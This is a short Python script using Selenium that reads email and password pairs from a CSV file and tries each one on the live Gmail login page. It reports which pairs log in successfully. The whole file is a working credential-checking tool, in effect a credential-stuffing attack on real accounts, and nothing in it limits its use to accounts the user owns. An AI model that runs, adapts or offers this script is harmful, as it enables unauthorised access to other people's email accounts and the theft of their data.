"""
	Python Script to test whether given list of mail ID and passwords are correct
	- Ajinkya Sonawane
	
	Steps to execute
	
	1.Install Chrome Driver
	2.Download 'selenium' module using 'pip'
	3.Create a CSV of emails and passwords
    4.CSV should contain 2 columns 'email' and 'password' only
	5.Execute this Python script
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import *
import _thread
import csv



flag = 0
#Function to check if login is successfull
def SuccessLogin():
    global flag
    while True:
        try:
            ele3 = driver.find_element_by_xpath('//*[@id=":dv"]/div/div')
            flag = 2
            break
        except Exception as r:
            pass

#Function to check if login failed			
def FailLogin():
    global flag
    while True:
        try:
            ele3 = driver.find_element_by_xpath('//*[@id="password"]/div[2]/div[2]')
            if ele3.text == "Wrong password. Try again.":                
                flag = 1
                break
        except Exception as r:
            pass

#Program Starts here

#import the csv file			
with open("FileName.csv") as file:

    readfile = csv.reader(file,delimiter=',')

    emails = {}
    x=0
    for row in readfile:
        emails[x] = [row[0],row[1]]
        x+=1



for i in emails:
    
    driver = webdriver.Chrome('F:/chromedriver')
    driver.get("http://mail.google.com")

    elem = driver.find_element_by_name("identifier")
    elem.send_keys(emails[i][0])
    ele2 = driver.find_element_by_xpath('//*[@id="identifierNext"]/content/span')
    ele2.click()

    while True:
        try:
            elep = driver.find_element_by_name("password")
            elep.send_keys(emails[i][1])           
            break
        except Exception as r:
            pass


    while True:
        try:
            ele3 = driver.find_element_by_xpath('//*[@id="passwordNext"]')    
            ele3.click()        
            break
        except Exception as r:
            pass
        

    flag = 0
	#start threads to check whether login is successfull or not
    _thread.start_new_thread(SuccessLogin,())
    _thread.start_new_thread(FailLogin,())

    while flag == 0:
        pass
     
    if flag == 1:
		#if login fails print Fail
        print("Fail")
    elif flag == 2:
		#If login is successfull then print a message and logout
        print("Cool")
        driver.get('https://mail.google.com/mail/logout?hl=en')
        while True:
            try:
                elep = driver.find_element_by_name("password")
                driver.close()
                break
            except Exception as r:
                pass
    driver.quit()
    
        



